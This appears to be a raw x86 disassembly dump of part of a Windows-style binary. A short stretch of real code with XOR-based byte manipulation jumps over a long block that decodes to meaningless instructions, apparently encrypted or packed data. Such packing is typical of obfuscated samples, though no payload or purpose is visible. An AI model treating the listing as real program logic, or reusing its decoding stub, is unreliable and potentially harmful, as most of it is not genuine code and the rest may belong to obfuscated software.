  408206:	test   eax,eax
  408208:	je     0x408233
  40820e:	lea    eax,[ebp-0x78]
  408211:	push   eax
  408212:	mov    eax,DWORD PTR [ebp-0x14]
  408215:	xor    eax,esi
  408217:	add    eax,edi
  408219:	push   eax
  40821a:	mov    eax,DWORD PTR [ebp-0x10]
  40821d:	add    eax,0xee
  408222:	push   eax
  408223:	mov    eax,DWORD PTR [ebp-0x10]
  408226:	mov    eax,DWORD PTR [eax+0x198]
  40822c:	push   DWORD PTR [eax]
  40822e:	call   0x4120bb
  408233:	mov    ecx,DWORD PTR [ebp-0x1c]
  408236:	xor    ecx,esi
  408238:	mov    eax,0xffcd8d64
  40823d:	sub    eax,ecx
  40823f:	sub    eax,DWORD PTR [ebp-0x8]
  408242:	mov    ecx,DWORD PTR [ebp-0x30]
  408245:	add    ecx,eax
  408247:	mov    eax,DWORD PTR [ebp-0x8]
  40824a:	mov    DWORD PTR [eax+0x1],ecx
  40824d:	mov    al,BYTE PTR [ebp-0x1]
  408250:	mov    ecx,DWORD PTR [ebp-0x8]
  408253:	xor    al,0x47
  408255:	sub    al,0x37
  408257:	jmp    0x4085a4
  40825c:	ja     0x408201
  40825e:	mov    ecx,0x7175496f
  408263:	mov    ds:0xd6da6ce9,eax
  408268:	mov    al,0xa3
  40826a:	ret    
  40826b:	xor    DWORD PTR [edi],esi
  40826d:	shl    BYTE PTR [eax+0x70],cl
  408270:	and    BYTE PTR [ebp+0x70],bh
  408273:	jo     0x408247
  408275:	mov    ebx,0x16a87d04
  40827a:	outs   dx,DWORD PTR ds:[esi]
  40827b:	push   ds
  40827c:	retf   0x68c7
  40827f:	or     DWORD PTR [edi-0x4b],edx
  408282:	cdq    
  408283:	arpl   di,di
  408285:	mov    BYTE PTR [esi+ebp*1-0x47],dh
  408289:	je     0x4082cb
  40828b:	popa   
  40828c:	(bad)  
  40828d:	xchg   ebp,eax
  40828e:	pop    ss
  40828f:	and    DWORD PTR [ebp-0x68d24f94],ecx
  408295:	outs   dx,BYTE PTR ds:[esi]
  408296:	and    ch,BYTE PTR [ebx]
  408298:	rcr    DWORD PTR [esi+edi*1],1
  40829b:	push   edi
  40829c:	ret    
  40829d:	fimul  WORD PTR [ebx+0x32a92fe8]
  4082a3:	(bad)  
  4082a4:	pop    ebp
  4082a5:	in     eax,dx
  4082a6:	imul   edx,esp,0xffffffa5
  4082a9:	into   
  4082aa:	aaa    
  4082ab:	mov    al,0x17
  4082ad:	mov    al,0x37
  4082af:	xchg   esi,eax
  4082b0:	fisttp QWORD PTR [ebp+ebp*2+0x32]
  4082b4:	mov    esi,0x98d33a3f
  4082b9:	jl     0x408247
  4082bb:	adc    al,0xdd
  4082bd:	ja     0x4082f0
  4082bf:	mov    WORD PTR [ecx+ebp*2-0x14],fs
  4082c3:	mov    esi,0xae6a2ca
  4082c8:	aas    
  4082c9:	or     ebx,DWORD PTR [ebx]
  4082cb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4082cc:	xchg   BYTE PTR ds:0x426094d0,ch
  4082d2:	div    dl
  4082d4:	cmp    edx,DWORD PTR [edi+0x3424c437]
  4082da:	out    dx,eax
  4082db:	sbb    ebx,DWORD PTR [edx]
  4082dd:	mov    esi,0xa059589d
  4082e2:	rcr    BYTE PTR [ebx+0x50],0x66
  4082e6:	pop    esi
  4082e7:	and    al,0x72
  4082e9:	inc    ebp
  4082ea:	shl    DWORD PTR [edi-0x1710cf07],1
  4082f0:	add    al,0xe5
  4082f2:	push   cs
  4082f3:	jb     0x408314
  4082f5:	hlt    
  4082f6:	(bad)  
  4082f7:	je     0x40835d
  4082f9:	lahf   
  4082fa:	pop    ebx
  4082fb:	repz mov ecx,0x1f8b9dcc
  408301:	scas   eax,DWORD PTR es:[edi]
  408302:	jns    0x408311
  408304:	sub    ch,BYTE PTR [esi]
  408306:	in     eax,dx
  408307:	ret    
  408308:	push   0xbd895dcf
  40830d:	inc    ebx
  40830e:	jl     0x4082ee
  408310:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408311:	jns    0x4082b2
  408313:	(bad)  
  408314:	sub    al,0xe4
  408316:	call   0x4340a1b9
  40831b:	dec    ecx
  40831c:	pop    ss
  40831d:	or     BYTE PTR [esi],bl
  40831f:	xor    al,0xd6
  408321:	pop    edx
  408322:	sti    
  408323:	adc    al,BYTE PTR [ebp-0x3e517f2c]
  408329:	xlat   BYTE PTR ds:[ebx]
  40832a:	test   al,0x28
  40832c:	xchg   ebx,eax
  40832d:	jp     0x4082ea
  40832f:	jge    0x4082cb
  408331:	ffreep st(2)
  408333:	sub    cl,BYTE PTR [edi+ebx*2+0x1a]
  408337:	dec    edi
  408338:	shl    BYTE PTR [ebx],1
  40833a:	mov    cl,0x38
  40833c:	fsub   QWORD PTR [ecx-0x63d96d3b]
  408342:	xor    bl,ah
  408344:	fnstenv [edx+ecx*1]
  408347:	add    ebp,edi
  408349:	pop    ds
  40834a:	inc    esi
  40834b:	push   ds
  40834c:	bound  ebp,QWORD PTR [esi-0x6c]
  40834f:	imul   ecx,DWORD PTR ds:0xd9df6a04,0x14
  408356:	adc    eax,0x62eec55a
  40835b:	jmp    0x4082ed
  40835d:	in     eax,dx
  40835e:	out    dx,al
  40835f:	xor    eax,0x70d25afe
  408364:	stos   BYTE PTR es:[edi],al
  408365:	mov    edx,0xf34c5b9b
  40836a:	inc    eax
  40836b:	and    al,BYTE PTR [edx-0x18c7a0e6]
  408371:	dec    eax
  408372:	sub    bh,cl
  408374:	and    BYTE PTR [esi],dh
  408376:	pop    ecx
  408377:	mov    bl,0x20
  408379:	and    edx,DWORD PTR [eax-0x4b]
  40837c:	inc    eax
  40837d:	adc    ebx,DWORD PTR [esi]
  40837f:	test   al,0x47
  408381:	jecxz  0x4083ca
  408383:	mov    DWORD PTR [ebx],esp
  408385:	repz ss dec esi
  408388:	sub    al,0x6b
  40838a:	icebp  
  40838b:	and    eax,0x9fe1fbd8
  408390:	sbb    eax,0x22845c3b
  408395:	jmp    0x31367742
  40839a:	cmp    al,0xc4
  40839c:	jnp    0x40832a
  40839e:	scas   eax,DWORD PTR es:[edi]
  40839f:	nop
  4083a0:	(bad)  
  4083a2:	fisttp DWORD PTR [ebx-0x4ff93ebb]
  4083a8:	js     0x4083cd
  4083aa:	xchg   esi,eax
  4083ab:	lds    ecx,FWORD PTR [ecx-0xf]
  4083ae:	out    dx,eax
  4083af:	loop   0x40841f
  4083b1:	mov    al,0x37
  4083b3:	push   ebp
  4083b4:	imul   ecx,DWORD PTR [edi-0x2e],0x5294a684
  4083bb:	mov    ds:0xa029f817,eax
  4083c0:	jb     0x4083c2
  4083c2:	xchg   esp,eax
  4083c3:	xchg   edx,eax
  4083c4:	test   BYTE PTR [esi],dl
  4083c6:	jmp    0x40838b
  4083c8:	call   0x87d7:0xc12f6538
  4083cf:	push   edx
  4083d0:	shl    DWORD PTR [esi+0x432db776],cl
  4083d6:	inc    ebx
  4083d7:	mov    WORD PTR [esi],?
  4083d9:	mov    ecx,0x7782ebab
  4083de:	jne    0x4083bb
  4083e0:	test   BYTE PTR [edi-0x35893e55],dl
  4083e6:	or     DWORD PTR [esi-0x1d85a911],0xf387eed6
  4083f0:	inc    edx
  4083f1:	push   0xffffff8f
  4083f3:	das    
  4083f4:	fnstenv ds:0x2dd4f259
  4083fa:	or     esp,DWORD PTR [edi-0x7a]
  4083fd:	sbb    BYTE PTR [edi-0x1724a62c],0x4e
  408404:	mov    edx,0x97edef0b
  408409:	inc    eax
  40840a:	aas    
  40840b:	aas    
  40840c:	stos   DWORD PTR es:[edi],eax
  40840d:	into   
  40840e:	pop    ebp
  40840f:	repz adc eax,0x1080a0a1
  408415:	cdq    
  408416:	dec    esp
  408417:	fnstcw WORD PTR [esi+0x18]
  40841a:	pop    ss
  40841b:	jl     0x408404
  40841d:	jl     0x408434
  40841f:	push   0x4ae9f30b
  408424:	stc    
  408425:	aas    
  408426:	sub    ebp,DWORD PTR [ecx]
  408428:	adc    ebp,DWORD PTR [esi+0xe820277]
  40842e:	mov    dh,0xb5
  408430:	mov    bh,0x77
  408432:	inc    ebp
  408433:	fdivr  DWORD PTR [edi]
  408435:	ins    DWORD PTR es:[edi],dx
  408436:	in     al,dx
  408437:	idiv   DWORD PTR es:[eax+0x41443470]
  40843e:	and    eax,0x6ce552be
  408443:	sbb    eax,0x4099d5ce
  408448:	xchg   edx,eax
  408449:	xchg   cl,bh
  40844b:	inc    ecx
  40844c:	idiv   DWORD PTR [ebx+0x15]
  40844f:	pop    esp
  408450:	sub    DWORD PTR [ecx+0x56ff8616],ecx
  408456:	loopne 0x4084a6
  408458:	rol    bh,0x2d
  40845b:	lock ds (bad) 
  40845f:	or     DWORD PTR [ebp+0x5a],esi
  408462:	test   DWORD PTR [ebx+eax*4],edx
  408465:	enter  0x40ea,0x1e
  408469:	enter  0x1162,0xa3
  40846d:	inc    esp
  40846e:	fbld   TBYTE PTR [edx]
  408470:	jp     0x40841d
  408472:	outs   dx,DWORD PTR ds:[esi]
  408473:	mov    bl,0xfd
  408475:	stc    
  408476:	ret    0x8386
  408479:	ss push ss
  40847b:	adc    eax,0x2bcbb210
  408480:	xor    al,0x7f
  408482:	fwait
  408483:	jnp    0x40845c
  408485:	into   
  408486:	das    
  408487:	scas   al,BYTE PTR es:[edi]
  408488:	mov    dh,0x8f
  40848a:	lds    edi,FWORD PTR [ebp+ecx*2+0x2f164891]
  408491:	pushf  
  408492:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408493:	mov    ebx,DWORD PTR [edx]
  408495:	inc    ecx
  408496:	adc    DWORD PTR [edx],ecx
  408498:	loop   0x4084d1
  40849a:	aad    0xe4
  40849c:	pop    eax
  40849d:	test   eax,0xad7e9f3e
  4084a2:	push   0xffffffac
  4084a4:	data16 and al,0xa8
  4084a7:	(bad)  
  4084a8:	cmp    DWORD PTR [esi+0x7bced2bb],edx
  4084ae:	in     al,dx
  4084af:	xor    BYTE PTR [esi],0xbd
  4084b2:	and    BYTE PTR [edi+0x5e],0xcd
  4084b6:	add    bl,bl
  4084b8:	call   0x6199:0x78e85076
  4084bf:	out    dx,al
  4084c0:	enter  0x70ec,0xf9
  4084c4:	push   es
  4084c5:	(bad)  
  4084c6:	lods   al,BYTE PTR ds:[esi]
  4084c7:	es inc edi
  4084c9:	or     BYTE PTR [edi],al
  4084cb:	pop    esi
  4084cc:	push   es
  4084cd:	jno    0x4084f1
  4084cf:	dec    ecx
  4084d0:	inc    edx
  4084d1:	cdq    
  4084d2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4084d3:	xchg   DWORD PTR es:[eax],edx
  4084d6:	jae    0x4084f7
  4084d8:	scas   al,BYTE PTR es:[edi]
  4084d9:	fist   WORD PTR [ecx-0x4d]
  4084dc:	into   
  4084dd:	xchg   esp,eax
  4084de:	ret    0x8b32
  4084e1:	lahf   
  4084e2:	fwait
  4084e3:	add    DWORD PTR [ecx-0x80],ebx
  4084e6:	xor    BYTE PTR [edi+eiz*1-0x38],bl
  4084ea:	mov    ebx,0x57b8c327
  4084ef:	or     al,bh
  4084f1:	lds    esi,FWORD PTR [esi+0x0]
  4084f4:	cmp    bh,al
  4084f6:	sub    esp,edx
  4084f8:	add    esi,esi
  4084fa:	or     DWORD PTR [eax+0x7d],esp
  4084fd:	jns    0x40853b
  4084ff:	out    dx,al
  408500:	or     dl,BYTE PTR [ecx]
  408502:	push   edi
  408503:	or     BYTE PTR [ecx-0x29],0xb5
  408507:	frstor [ebp-0xc]
  40850a:	and    eax,0x14eacfb8
  40850f:	out    0xba,eax
  408511:	in     eax,0x79
  408513:	addr16 bnd jo 0x40857e
  408517:	mov    dh,0x39
  408519:	retf   0x7f21
  40851c:	(bad)  
  40851d:	cmp    eax,0x78d9556b
  408522:	pop    edi
  408523:	push   ebx
  408524:	sub    cl,cl
  408526:	mov    BYTE PTR [edi+0x73a50946],bl
  40852c:	js     0x4084b7
  40852e:	repnz ss mov esp,0xf577c179
  408535:	cmp    eax,0x991deb21
  40853a:	jg     0x408515
  40853c:	shr    BYTE PTR [esp+edx*1-0x61],0x4b
  408541:	dec    edi
  408542:	lods   al,BYTE PTR ds:[esi]
  408543:	jnp    0x40858b
  408545:	lds    edi,FWORD PTR [edx+0x17]
  408548:	and    eax,0xad837798
  40854d:	or     ebp,ebp
  40854f:	lods   eax,DWORD PTR ds:[esi]
  408550:	push   ebp
  408551:	clc    
  408552:	test   BYTE PTR [esi],cl
  408554:	popf   
  408555:	fcom   QWORD PTR [edi]
  408557:	(bad)  
  408558:	jns    0x408568
  40855a:	repz push ss
  40855c:	and    BYTE PTR [edi+0x2952c39a],0xf6
  408563:	loope  0x40857a
  408565:	das    
  408566:	mov    ah,BYTE PTR [ebp+0x13a5ff21]
  40856c:	pop    ebp
  40856d:	and    esi,esi
  40856f:	and    bl,BYTE PTR [edi+0x23350ed6]
  408575:	sbb    al,0xf0
  408577:	sahf   
  408578:	mov    ebx,0xd1918952
  40857d:	fdiv   QWORD PTR [ecx-0x7d]
  408580:	push   0xccba0f14
  408585:	and    eax,0x37444179
  40858a:	add    bl,BYTE PTR [esi-0x49]
  40858d:	enter  0xe69f,0xc
  408591:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408592:	(bad)  
  408593:	imul   esp,DWORD PTR [edx+edi*8],0x49
  408597:	push   esi
  408598:	shl    bh,cl
  40859a:	dec    esp
  40859b:	mov    ebx,0xb2f777c0
  4085a0:	mov    bh,BYTE PTR [esi-0x53]
  4085a3:	cwde   
  4085a4:	mov    BYTE PTR [ecx],al
  4085a6:	jmp    0x4088f3
  4085ab:	inc    edi
  4085ac:	cli    
  4085ad:	fisttp DWORD PTR [edx+0x517569e1]
  4085b3:	jp     0x40858b
  4085b5:	xchg   ecx,eax
  4085b6:	mov    edx,0x3f37bce1
  4085bb:	out    0xdf,eax
  4085bd:	jo     0x40862f
  4085bf:	and    BYTE PTR [ebp+0x70],bh
  4085c2:	jo     0x4085a9
  4085c4:	jae    0x40862a
  4085c6:	aam    0x81
  4085c8:	push   esp
  4085c9:	inc    eax
  4085ca:	push   ds
  4085cb:	sub    al,0xe2
  4085cd:	xchg   ebp,eax
  4085ce:	mov    ch,bl
  4085d0:	fidiv  WORD PTR [edx+ebp*4]
  4085d3:	jbe    0x40861d
  4085d5:	cmp    DWORD PTR [eax+0x16],esi
  4085d8:	jg     0x40864d
  4085da:	int3   
  4085db:	not    BYTE PTR [edx]
  4085dd:	fldenv [ecx-0x5f]
  4085e0:	jno    0x4085e1
  4085e2:	push   0x48
  4085e4:	dec    ecx
  4085e5:	das    
  4085e6:	and    edi,DWORD PTR [edx]
  4085e8:	adc    ah,bh
  4085ea:	and    DWORD PTR [bp+di-0xa],esi
  4085ee:	dec    esi
  4085ef:	fucomi st,st(6)
  4085f1:	add    al,0x6e
  4085f3:	sti    
  4085f4:	inc    edx
  4085f5:	ror    BYTE PTR [edi-0x7d],1
  4085f8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4085f9:	out    dx,eax
  4085fa:	enter  0x5ed4,0xfa
  4085fe:	pop    esi
  4085ff:	add    eax,0x72ceb2bd
  408604:	xor    al,0x59
  408606:	call   0xac18:0x24d4955e
  40860d:	fldenv [ebp+0x555a4088]
  408613:	aas    
  408614:	in     eax,0x62
  408616:	sahf   
  408617:	jae    0x40860d
  408619:	and    esi,eax
  40861b:	jo     0x4085c9
  40861d:	lods   al,BYTE PTR ds:[esi]
  40861e:	fstp   TBYTE PTR [ebx]
  408620:	xchg   dh,ah
  408622:	mov    esi,0xf856e051
  408627:	lods   al,BYTE PTR ds:[esi]
  408628:	cmp    al,0x8b
  40862a:	push   ds
  40862b:	popf   
  40862c:	repz dec esi
  40862e:	xchg   ecx,eax
  40862f:	pop    esp
  408630:	push   es
  408631:	pop    esp
  408632:	push   ecx
  408633:	dec    ecx
  408634:	or     ah,BYTE PTR [ebx]
  408636:	cs jo  0x40861c
  408639:	push   edi
  40863a:	or     al,0xc2
  40863c:	adc    DWORD PTR [ebp+0x45],eax
  40863f:	jmp    0xdf3ccef7
  408644:	bnd jge 0x408669
  408647:	jle    0x408637
  408649:	in     al,dx
  40864a:	xchg   ebp,eax
  40864b:	add    eax,0x654b6a90
  408650:	scas   eax,DWORD PTR es:[edi]
  408651:	add    DWORD PTR [eax+0x6b6c6e22],esp
  408657:	cmc    
  408658:	xor    eax,0xd9c682a2
  40865d:	inc    edi
  40865e:	int    0x11
  408660:	ret    0x1765
  408663:	outs   dx,DWORD PTR ds:[esi]
  408664:	xchg   esi,eax
  408665:	cld    
  408666:	test   DWORD PTR ds:0x99adc361,edi
  40866c:	cli    
  40866d:	jg     0x4086a9
  40866f:	repnz mov WORD PTR ds:0x8a57529e,ss
  408676:	jb     0x4086d8
  408678:	in     al,dx
  408679:	mov    ch,0x11
  40867b:	push   0x3358ebb7
  408680:	in     eax,0xea
  408682:	mov    ebx,0x75e05fa8
  408687:	das    
  408688:	xchg   edx,eax
  408689:	adc    eax,0xa98ca009
  40868e:	stc    
  40868f:	adc    al,0xd6
  408691:	lods   eax,DWORD PTR ds:[esi]
  408692:	cmp    eax,0x91ee1204
  408697:	test   BYTE PTR [ecx+0x4023c377],cl
  40869d:	rcr    BYTE PTR fs:[ebp+eiz*4-0x3],0x90
  4086a3:	jmp    0xf2cb5c20
  4086a8:	pop    edi
  4086a9:	fisubr WORD PTR [esi+0x7f]
  4086ac:	sub    bh,bl
  4086ae:	pushf  
  4086af:	cmp    al,BYTE PTR [edx]
  4086b1:	scas   al,BYTE PTR es:[edi]
  4086b2:	xor    BYTE PTR [edx],0xdc
  4086b5:	mov    cl,0x72
  4086b7:	fld    QWORD PTR [edx+ebx*8+0x7b395479]
  4086be:	push   cs
  4086bf:	jno    0x408673
  4086c1:	pop    esp
  4086c2:	fdiv   DWORD PTR [edi-0xa]
  4086c5:	mov    ah,0xb8
  4086c7:	add    ebx,DWORD PTR [edx+0x32]
  4086ca:	mov    ecx,0xdac38f9f
  4086cf:	call   0x97d8:0x2afa789d
  4086d6:	push   cs
  4086d7:	pop    esp
  4086d8:	add    al,0x6d
  4086da:	add    DWORD PTR [edx-0x6b26c06d],0xffffffb1
  4086e1:	out    0x9c,eax
  4086e3:	push   ecx
  4086e4:	cmc    
  4086e5:	lods   eax,DWORD PTR gs:[esi]
  4086e7:	popa   
  4086e8:	retf   
  4086e9:	adc    al,0xe1
  4086eb:	pop    ebp
  4086ec:	(bad)  
  4086ed:	(bad)  
  4086ee:	mov    ebx,0x4efc5607
  4086f3:	movups xmm2,XMMWORD PTR [ebx-0x9]
  4086f7:	sub    bl,BYTE PTR [ecx+0x5b93136d]
  4086fd:	inc    esp
  4086fe:	imul   edx,edx,0xc96f8319
  408704:	out    0x94,eax
  408706:	or     esi,DWORD PTR [eax]
  408708:	rcl    BYTE PTR [ebp+0x21],0xe
  40870c:	push   edi
  40870d:	into   
  40870e:	dec    edx
  40870f:	sub    BYTE PTR [esi],bl
  408711:	out    0xc1,al
  408713:	sbb    eax,0x934ebf09
  408718:	jb     0x4086f1
  40871a:	jne    0x408761
  40871c:	sbb    eax,0x2f1f64f0
  408721:	not    ah
  408723:	push   ss
  408724:	cmp    al,0xfa
  408726:	pop    ecx
  408727:	dec    esp
  408728:	pusha  
  408729:	mov    gs,WORD PTR [esi+0x29]
  40872c:	xchg   ebp,eax
  40872d:	mov    dh,cl
  40872f:	jns    0x4086ef
  408731:	cwde   
  408732:	sahf   
  408733:	shr    DWORD PTR [ecx-0x73],1
  408736:	int    0x12
  408738:	push   ss
  408739:	dec    ecx
  40873a:	push   0x4b
  40873c:	arpl   WORD PTR [edx-0x9bf9ec5],di
  408742:	les    edi,FWORD PTR [eax-0x6417ce23]
  408748:	sub    al,0x9f
  40874a:	dec    esp
  40874b:	test   eax,edi
  40874d:	gs fwait
  40874f:	aad    0xb2
  408751:	in     eax,dx
  408752:	int    0xd6
  408754:	leave  
  408755:	ror    DWORD PTR [eax+0x3020e3a2],0xff
  40875c:	rol    bh,1
  40875e:	in     eax,dx
  40875f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408760:	add    ax,0xfd9a
  408764:	outs   dx,BYTE PTR ds:[esi]
  408765:	ret    
  408766:	push   ebx
  408767:	adc    BYTE PTR ds:0xb43d9765,0xbe
  40876e:	and    BYTE PTR [edi-0x55],ch
  408771:	cmp    eax,0xfbaed07
  408776:	lds    esi,FWORD PTR [ebx]
  408778:	outs   dx,BYTE PTR ds:[esi]
  408779:	in     al,dx
  40877a:	jmp    0x4087aa
  40877c:	xchg   ebp,eax
  40877d:	jnp    0x4087d1
  40877f:	aam    0xfb
  408781:	popa   
  408782:	fwait
  408783:	data16 loop 0x4087cb
  408786:	push   cs
  408787:	jne    0x408717
  408789:	mov    ss,WORD PTR [ecx-0x54c4104b]
  40878f:	clc    
  408790:	xchg   esp,eax
  408791:	dec    esp
  408792:	aas    
  408793:	mov    ds:0x494a65d5,eax
  408798:	sbb    eax,0x9d4ae5b3
  40879d:	sub    BYTE PTR [eax],ah
  40879f:	mov    bh,BYTE PTR [edx]
  4087a1:	or     BYTE PTR [esi-0x291da180],bl
  4087a7:	pop    esp
  4087a8:	jmp    0x4087a0
  4087aa:	mov    esi,0x3ec06dfa
  4087af:	jmp    0x4087fd
  4087b1:	retf   0x8cc4
  4087b4:	scas   eax,DWORD PTR es:[edi]
  4087b5:	int3   
  4087b6:	adc    edi,DWORD PTR [edx+0x5cefc05d]
  4087bc:	push   esp
  4087bd:	inc    edx
  4087be:	js     0x408802
  4087c0:	mov    ds:0xb7fe141e,eax
  4087c5:	jbe    0x4087f1
  4087c7:	mov    ds:0x50a9c2b8,al
  4087cc:	popa   
  4087cd:	jae    0x40880e
  4087cf:	cli    
  4087d0:	adc    al,0xa
  4087d2:	jns    0x40882c
  4087d4:	push   0x2c
  4087d6:	shl    DWORD PTR [ecx+0x12e811ff],1
  4087dc:	data16 rol BYTE PTR [edi+esi*4+0x21],cl
  4087e1:	add    ah,bh
  4087e3:	pop    esi
  4087e4:	lock mov ah,0xf0
  4087e7:	mov    ah,0x2d
  4087e9:	inc    esi
  4087ea:	push   ecx
  4087eb:	mov    ch,0xa0
  4087ed:	es sbb cl,cl
  4087f0:	sbb    ch,0x2d
  4087f3:	push   eax
  4087f4:	add    al,0x24
  4087f6:	pop    ecx
  4087f7:	fs fmulp st(0),st
  4087fa:	clc    
  4087fb:	lods   eax,DWORD PTR ds:[esi]
  4087fc:	cmc    
  4087fd:	idiv   DWORD PTR [ebp-0x52]
  408800:	into   
  408801:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408802:	push   0x8a11b138
  408807:	dec    ebp
  408808:	enter  0x52a2,0x8a
  40880c:	cmp    DWORD PTR [eax+0x66],esi
  40880f:	pop    ebp
  408810:	pop    ss
  408811:	ds mov esp,0x2d8827ba
  408817:	addr16 jg 0x40884f
  40881a:	sbb    eax,0xbcd53c47
  40881f:	test   DWORD PTR [ebp+0x4b],ebp
  408822:	retf   
  408823:	pusha  
  408824:	imul   DWORD PTR [edi]
  408826:	nop
  408827:	dec    ebp
  408828:	adc    BYTE PTR [eax-0x4f2155a9],ah
  40882e:	cwde   
  40882f:	(bad)  
  408830:	push   esi
  408831:	dec    edi
  408832:	inc    ecx
  408833:	ins    BYTE PTR es:[edi],dx
  408834:	sbb    DWORD PTR [edx],esp
  408836:	mov    ebp,0x515ec782
  40883b:	mov    dl,0xba
  40883d:	push   0x78
  40883f:	les    ebp,FWORD PTR cs:[esi-0x5d]
  408843:	stos   BYTE PTR es:[edi],al
  408844:	(bad)  
  408845:	aam    0xe5
  408847:	dec    ecx
  408848:	mov    ds:0x67329c09,al
  40884d:	pop    ecx
  40884e:	mov    edi,0x54584e4e
  408853:	popf   
  408854:	sbb    eax,0xb0d3f161
  408859:	add    eax,DWORD PTR [edx]
  40885b:	shr    DWORD PTR [eax+esi*1+0x31ccad8b],cl
  408862:	retf   0x2f0a
  408865:	je     0x4088c4
  408867:	dec    ebp
  408868:	stos   BYTE PTR es:[edi],al
  408869:	inc    ebx
  40886a:	inc    ebx
  40886b:	mov    ds:0x10648b2d,al
  408870:	sar    BYTE PTR [esi+0x73474c74],0x2c
  408877:	sbb    eax,0xeebb47c7
  40887c:	cmp    ecx,eax
  40887e:	mov    edi,0xfd72e519
  408883:	xlat   BYTE PTR ds:[ebx]
  408884:	adc    ecx,DWORD PTR [ecx-0xfa218a5]
  40888a:	js     0x4088ec
  40888c:	outs   dx,BYTE PTR ds:[esi]
  40888d:	dec    ebx
  40888e:	push   0x5b
  408890:	ins    BYTE PTR es:[edi],dx
  408891:	and    BYTE PTR [esi-0x74113f6b],bl
  408897:	xchg   BYTE PTR [edx-0x4c],al
  40889a:	sbb    dl,BYTE PTR [esi-0x2b5dd692]
  4088a0:	lea    esp,[ebx]
  4088a2:	dec    esi
  4088a3:	and    eax,0xdec45fb1
  4088a8:	mov    WORD PTR ds:0xc3d3da35,cs
  4088ae:	inc    ebp
  4088af:	jne    0x408836
  4088b1:	arpl   WORD PTR [ebx],bp
  4088b3:	dec    eax
  4088b4:	repnz push edi
  4088b6:	in     al,0x34
  4088b8:	in     eax,dx
  4088b9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4088ba:	mul    al
  4088bc:	jecxz  0x4088f8
  4088be:	add    bl,BYTE PTR [ebx+eiz*2+0x16]
  4088c2:	popa   
  4088c3:	and    eax,0x16c76cc1
  4088c8:	and    eax,DWORD PTR [esi-0x73]
  4088cb:	xchg   esi,eax
  4088cc:	fst    QWORD PTR [edi+edx*1+0x76]
  4088d0:	push   esp
  4088d1:	gs adc eax,0x3e83f46b
  4088d7:	cmp    edx,DWORD PTR [eax+0x1c1cf0c8]
  4088dd:	and    ebx,DWORD PTR [eax]
  4088df:	mov    cl,0x46
  4088e1:	retf   0x1402
  4088e4:	push   eax
  4088e5:	ins    DWORD PTR es:[edi],dx
  4088e6:	mov    bl,0x5d
  4088e8:	jb     0x40892d
  4088ea:	test   al,0x47
  4088ec:	in     eax,0xc5
  4088ee:	mov    esi,0xc0ae3b7f
  4088f3:	lea    eax,[ebp-0x8]
  4088f6:	inc    BYTE PTR [eax]
  4088f8:	inc    eax
  4088f9:	push   eax
  4088fa:	jmp    0x408c47
  4088ff:	mov    al,0x3c
  408901:	fwait
  408902:	xchg   ebx,eax
  408903:	fwait
  408904:	jae    0x40896e
  408906:	rol    DWORD PTR [ebp-0x4dbca301],cl
  40890c:	imul   ebp,DWORD PTR [ebx+0x1b],0x7070dc97
  408913:	and    BYTE PTR [ebp+0x70],bh
  408916:	jo     0x40896d
  408918:	and    al,0x30
  40891a:	adc    ecx,DWORD PTR [edx]
  40891c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40891d:	fidivr DWORD PTR [edx+0x2059022a]
  408923:	pop    es
  408924:	paddusb mm3,QWORD PTR cs:[ebx]
  408928:	sbb    bl,BYTE PTR [edi]
  40892a:	mov    ebp,0x4c11e9b5
  40892f:	sub    eax,0xc30a65bd
  408934:	cmp    BYTE PTR [edx-0x6a1cd41e],bl
  40893a:	(bad)  
  40893b:	stc    
  40893c:	dec    edi
  40893d:	xacquire xchg BYTE PTR [ebx+0x52cffea2],dh
  408944:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408945:	xor    ecx,DWORD PTR ds:0xc3c5586b
  40894b:	mov    BYTE PTR [edx+0x28e86a11],0x9b
  408952:	cmp    DWORD PTR [eax-0x39d28b88],ecx
  408958:	pop    ebp
  408959:	(bad)  
  40895a:	mov    ds:0xda75d0bc,eax
  40895f:	pop    ebx
  408960:	lea    ecx,ds:0x5eb65570
  408966:	xlat   BYTE PTR ds:[ebx]
  408967:	mov    cl,0xad
  408969:	shl    al,cl
  40896b:	loopne 0x408913
  40896d:	in     eax,dx
  40896e:	mov    al,ds:0x43b2d563
  408973:	inc    edi
  408974:	xchg   bl,ch
  408976:	inc    edi
  408977:	add    ah,0x8b
  40897a:	in     al,0xe1
  40897c:	xor    al,0xed
  40897e:	hlt    
  40897f:	sub    al,0x1d
  408981:	stc    
  408982:	xlat   BYTE PTR ds:[ebx]
  408983:	retf   
  408984:	popa   
  408985:	cld    
  408986:	and    DWORD PTR [esp+ecx*4],ebp
  408989:	xlat   BYTE PTR ds:[bx]
  40898b:	dec    ecx
  40898c:	and    al,0xdd
  40898e:	test   al,0xe9
  408990:	rcr    DWORD PTR [edi],1
  408992:	fbld   TBYTE PTR [ebp+0x253c1db1]
  408998:	adc    bl,BYTE PTR [ebp-0xe]
  40899b:	lds    ecx,FWORD PTR [esi+0x62]
  40899e:	or     DWORD PTR [ebx],0x63582fd9
  4089a4:	pop    eax
  4089a5:	mov    al,0xc1
  4089a7:	xor    eax,0x130f6733
  4089ac:	jmp    0x8a48:0xb61630b8
  4089b3:	or     BYTE PTR [edi-0x627bbae4],cl
  4089b9:	(bad)  
  4089ba:	jge    0x408a0d
  4089bc:	mov    eax,0x8f05dd7d
  4089c1:	nop
  4089c2:	out    0x66,al
  4089c4:	stos   BYTE PTR es:[edi],al
  4089c5:	cli    
  4089c6:	enter  0xcba6,0x30
  4089ca:	mov    eax,0xd32c7afc
  4089cf:	stc    
  4089d0:	idiv   BYTE PTR [ebx+0x36a47371]
  4089d6:	enter  0xb51b,0xcd
  4089da:	xchg   esp,eax
  4089db:	mov    edi,0xcb874823
  4089e0:	mov    ds:0x8caffce1,eax
  4089e5:	data16 ja 0x408989
  4089e8:	dec    edi
  4089e9:	es or  eax,0x7d8826b1
  4089ef:	sub    ebp,ebx
  4089f1:	push   DWORD PTR [edi]
